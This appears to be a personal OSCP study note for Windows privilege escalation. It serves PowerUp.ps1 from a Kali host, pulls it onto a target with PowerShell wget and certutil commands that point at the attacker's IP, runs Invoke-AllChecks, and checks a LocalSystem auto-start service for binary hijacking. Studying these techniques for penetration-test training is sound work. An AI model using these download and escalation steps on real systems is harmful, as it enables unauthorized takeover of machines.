
Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET

On KALI ATTACKER
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

On WINDOWS TARGET

Powershell (Modify Outfile Destination)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile C:\\\Users\\\mike\\\Desktop\\\PowerUp.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/PowerUp.ps1 PowerUp.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
. .\PowerUp.ps1; Invoke-AllChecks
```

---

```
sc.exe qc [servicename]
```

Example output
```powershell
sc.exe qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Autostart means reboot system to work
LocalSystem > Run as Root

[[Hijack EXE]]